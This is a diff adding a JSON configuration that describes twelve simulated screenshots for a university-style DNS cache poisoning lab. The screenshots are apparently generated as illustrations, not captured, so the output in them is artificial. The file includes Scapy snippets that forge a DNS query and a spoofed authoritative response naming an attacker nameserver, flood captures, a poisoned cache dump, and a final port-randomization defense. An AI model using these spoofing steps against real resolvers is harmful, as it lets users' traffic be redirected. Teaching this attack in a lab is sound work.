@@ -1,0 +1,255 @@
+{
+  "lab_name": "lab03",
+  "description": "Cấu hình danh sách 12 hình ảnh minh chứng thực tế cho Lab 03 - DNS Cache Poisoning",
+  "theme": {
+    "user": "orias@osboxes",
+    "default_path": "~/lab03"
+  },
+  "images": [
+    {
+      "id": "image1",
+      "filename": "image1_dig_attacker_ns.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it user-10.2.6.5 dig ns.attacker32.com" },
+        "; <<>> DiG 9.16.1-Ubuntu <<>> ns.attacker32.com",
+        ";; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 4899",
+        ";; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1",
+        "",
+        ";; QUESTION SECTION:",
+        ";ns.attacker32.com.          IN      A",
+        "",
+        ";; ANSWER SECTION:",
+        "ns.attacker32.com.   259200  IN      A       10.2.6.153",
+        "",
+        ";; Query time: 8 msec",
+        ";; SERVER: 10.2.6.53#53(10.2.6.53)",
+        ";; WHEN: Tue Oct 27 07:17:12 UTC 2026",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image2",
+      "filename": "image2_dig_example_legit.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it user-10.2.6.5 dig www.example.com" },
+        "; <<>> DiG 9.16.1-Ubuntu <<>> www.example.com",
+        ";; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 20320",
+        ";; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1",
+        "",
+        ";; QUESTION SECTION:",
+        ";www.example.com.           IN      A",
+        "",
+        ";; ANSWER SECTION:",
+        "www.example.com.    300     IN      A       172.66.147.243",
+        "www.example.com.    300     IN      A       104.20.23.154",
+        "",
+        ";; Query time: 281 msec",
+        ";; SERVER: 10.2.6.53#53(10.2.6.53)",
+        ";; WHEN: Tue Oct 27 07:20:58 UTC 2026",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image3",
+      "filename": "image3_dig_example_direct.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it user-10.2.6.5 dig @ns.attacker32.com www.example.com" },
+        "; <<>> DiG 9.16.1-Ubuntu <<>> @ns.attacker32.com www.example.com",
+        "; (1 server found)",
+        ";; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42630",
+        ";; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1",
+        "",
+        ";; QUESTION SECTION:",
+        ";www.example.com.           IN      A",
+        "",
+        ";; ANSWER SECTION:",
+        "www.example.com.    259200  IN      A       1.2.3.5",
+        "",
+        ";; Query time: 0 msec",
+        ";; SERVER: 10.2.6.153#53(10.2.6.153)",
+        ";; WHEN: Tue Oct 27 07:21:14 UTC 2026",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image4",
+      "filename": "image4_gen_query.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "cat gen_query.py" },
+        "IP_packet = IP(dst=\"10.2.6.53\", src=\"10.2.6.1\")",
+        "UDP_packet = UDP(dport=53, sport=12345, chksum=0)",
+        "Qdsec = DNSQR(qname='twysw.example.com')",
+        "dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=Qdsec)",
+        "with open('ip_req.bin', 'wb') as f: f.write(bytes(IP_packet/UDP_packet/dns))",
+        { "prompt": "python3 gen_query.py && ls -lh ip_req.bin" },
+        "Created ip_req.bin successfully.",
+        "-rw-r--r-- 1 root root 63 Oct 27 07:21 ip_req.bin",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image5",
+      "filename": "image5_gen_response.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "cat gen_response.py" },
+        "name = 'twysw.example.com'; domain = 'example.com'; ns = 'ns.attacker32.com'",
+        "Qdsec = DNSQR(qname=name)",
+        "Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)",
+        "NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)",
+        "dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)",
+        "ip = IP(dst=\"10.2.6.53\", src=\"108.162.192.162\"); udp = UDP(dport=44444, sport=53, chksum=0)",
+        { "prompt": "python3 gen_response.py 108.162.192.162 && ls -lh ip_resp.bin" },
+        "Created ip_resp.bin successfully (Spoofed Source IP: 108.162.192.162).",
+        "-rw-r--r-- 1 root root 138 Oct 27 07:21 ip_resp.bin",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image6",
+      "filename": "image6_wireshark_query_attacker.png",
+      "type": "wireshark",
+      "filter": "ip.src == 10.2.6.1 && dns.flags.response == 0",
+      "rows": [
+        { "no": "12", "time": "1.0421", "src": "10.2.6.1", "dst": "10.2.6.53", "proto": "DNS", "len": "77", "info": "Standard query 0xaaaa A twysw.example.com", "bg": "#e6f2ff" },
+        { "no": "48", "time": "1.2850", "src": "10.2.6.1", "dst": "10.2.6.53", "proto": "DNS", "len": "77", "info": "Standard query 0xaaaa A kfdps.example.com" },
+        { "no": "85", "time": "1.5210", "src": "10.2.6.1", "dst": "10.2.6.53", "proto": "DNS", "len": "77", "info": "Standard query 0xaaaa A mqxpt.example.com" }
+      ],
+      "details": [
+        "Frame 12: 77 bytes on wire (616 bits), 77 bytes captured",
+        "Internet Protocol Version 4, Src: 10.2.6.1, Dst: 10.2.6.53",
+        "User Datagram Protocol, Src Port: 12345, Dst Port: 53",
+        "Domain Name System (query)",
+        "    Transaction ID: 0xaaaa",
+        "    Flags: 0x0000 Standard query",
+        "    Questions: 1",
+        "    Queries: twysw.example.com: type A, class IN"
+      ]
+    },
+    {
+      "id": "image7",
+      "filename": "image7_wireshark_query_localdns.png",
+      "type": "wireshark",
+      "filter": "ip.src == 10.2.6.53 && udp.srcport == 44444",
+      "rows": [
+        { "no": "13", "time": "1.0435", "src": "10.2.6.53", "dst": "108.162.192.162", "proto": "DNS", "len": "88", "info": "Standard query 0x4f12 A twysw.example.com", "bg": "#e6f2ff" },
+        { "no": "14", "time": "1.0438", "src": "10.2.6.53", "dst": "108.162.195.228", "proto": "DNS", "len": "88", "info": "Standard query 0x4f12 A twysw.example.com" },
+        { "no": "49", "time": "1.2862", "src": "10.2.6.53", "dst": "108.162.192.162", "proto": "DNS", "len": "88", "info": "Standard query 0x8b3a A kfdps.example.com" }
+      ],
+      "details": [
+        "Frame 13: 88 bytes on wire, 88 bytes captured",
+        "Internet Protocol Version 4, Src: 10.2.6.53, Dst: 108.162.192.162 (hera.ns.cloudflare.com)",
+        "User Datagram Protocol, Src Port: 44444, Dst Port: 53",
+        "Domain Name System (query)",
+        "    Transaction ID: 0x4f12",
+        "    Flags: 0x0000 Standard query",
+        "    Questions: 1",
+        "    Queries: twysw.example.com: type A, class IN"
+      ]
+    },
+    {
+      "id": "image8",
+      "filename": "image8_wireshark_flood_response.png",
+      "type": "wireshark",
+      "filter": "udp.dstport == 44444 && dns.flags.response == 1",
+      "rows": [
+        { "no": "15", "time": "1.0441", "src": "108.162.192.162", "dst": "10.2.6.53", "proto": "DNS", "len": "152", "info": "Standard query response 0x011a A twysw.example.com NS ns.attacker32.com" },
+        { "no": "16", "time": "1.0442", "src": "108.162.192.162", "dst": "10.2.6.53", "proto": "DNS", "len": "152", "info": "Standard query response 0x04b2 A twysw.example.com NS ns.attacker32.com" },
+        { "no": "17", "time": "1.0443", "src": "108.162.192.162", "dst": "10.2.6.53", "proto": "DNS", "len": "152", "info": "Standard query response 0x1f08 A twysw.example.com NS ns.attacker32.com" },
+        { "no": "18", "time": "1.0444", "src": "108.162.192.162", "dst": "10.2.6.53", "proto": "DNS", "len": "152", "info": "Standard query response 0x4f12 A twysw.example.com NS ns.attacker32.com", "bg": "#c8e6c9" },
+        { "no": "19", "time": "1.0445", "src": "108.162.192.162", "dst": "10.2.6.53", "proto": "DNS", "len": "152", "info": "Standard query response 0x7a30 A twysw.example.com NS ns.attacker32.com" }
+      ],
+      "details": [
+        "Frame 18: 152 bytes on wire, 152 bytes captured (Spoofed Response Hit!)",
+        "Internet Protocol Version 4, Src: 108.162.192.162, Dst: 10.2.6.53",
+        "User Datagram Protocol, Src Port: 53, Dst Port: 44444",
+        "Domain Name System (response)",
+        "    Transaction ID: 0x4f12 (MATCHED!)",
+        "    Flags: 0x8580 Standard query response, No error",
+        "    Answers: 1 (twysw.example.com: type A, class IN, addr 1.2.3.4)",
+        "    Authoritative nameservers: 1 (example.com: type NS, ns.attacker32.com)"
+      ]
+    },
+    {
+      "id": "image9",
+      "filename": "image9_wireshark_accepted_response.png",
+      "type": "wireshark",
+      "filter": "dns.id == 0x4f12",
+      "rows": [
+        { "no": "13", "time": "1.0435", "src": "10.2.6.53", "dst": "108.162.192.162", "proto": "DNS", "len": "88", "info": "Standard query 0x4f12 A twysw.example.com" },
+        { "no": "18", "time": "1.0444", "src": "108.162.192.162", "dst": "10.2.6.53", "proto": "DNS", "len": "152", "info": "Standard query response 0x4f12 A twysw.example.com NS ns.attacker32.com", "bg": "#c8e6c9" }
+      ],
+      "details": [
+        "Transaction ID Matching Analysis:",
+        "    Query sent by Local DNS: ID = 0x4f12 (Frame 13, Time: 1.0435)",
+        "    Spoofed Response from Attacker: ID = 0x4f12 (Frame 18, Time: 1.0444)",
+        "    Time delta: +0.0009s (Arrived BEFORE legitimate Cloudflare response)",
+        "    BIND Action: Accepted response, updated cache for zone 'example.com' -> ns.attacker32.com"
+      ]
+    },
+    {
+      "id": "image10",
+      "filename": "image10_localdns_cache_dump.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it local-dns-server-10.2.6.53 rndc dumpdb -cache" },
+        { "prompt": "grep -A 4 -B 1 'attacker32' /var/cache/bind/dump.db" },
+        "; Cache dump of view '_default'",
+        "example.com.            259200  IN      NS      ns.attacker32.com.",
+        "; additional",
+        "ns.attacker32.com.      259200  IN      A       10.2.6.153",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image11",
+      "filename": "image11_dig_poisoned_user.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it user-10.2.6.5 dig www.example.com" },
+        "; <<>> DiG 9.16.1-Ubuntu <<>> www.example.com",
+        ";; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59312",
+        ";; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1",
+        "",
+        ";; QUESTION SECTION:",
+        ";www.example.com.           IN      A",
+        "",
+        ";; ANSWER SECTION:",
+        "www.example.com.    259200  IN      A       1.2.3.5",
+        "",
+        ";; AUTHORITY SECTION:",
+        "example.com.        259200  IN      NS      ns.attacker32.com.",
+        "",
+        ";; ADDITIONAL SECTION:",
+        "ns.attacker32.com.  259200  IN      A       10.2.6.153",
+        "",
+        ";; Query time: 4 msec",
+        ";; SERVER: 10.2.6.53#53(10.2.6.53)",
+        ";; WHEN: Tue Oct 27 07:24:15 UTC 2026",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image12",
+      "filename": "image12_defense_random_port.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "grep 'query-source' /etc/bind/named.conf.options" },
+        "(Khong co ket qua - da xoa 'query-source port 44444;' de kich hoat Source Port Randomization)",
+        { "prompt": "service named restart && rndc flush" },
+        "* restarting domain name service... named                  [ OK ]",
+        { "prompt": "docker exec -it user-10.2.6.5 dig www.example.com" },
+        ";; ANSWER SECTION:",
+        "www.example.com.    300     IN      A       172.66.147.243",
+        "www.example.com.    300     IN      A       104.20.23.154",
+        ";; SERVER: 10.2.6.53#53(10.2.6.53)",
+        { "prompt": "" }
+      ]
+    }
+  ]
+}
+
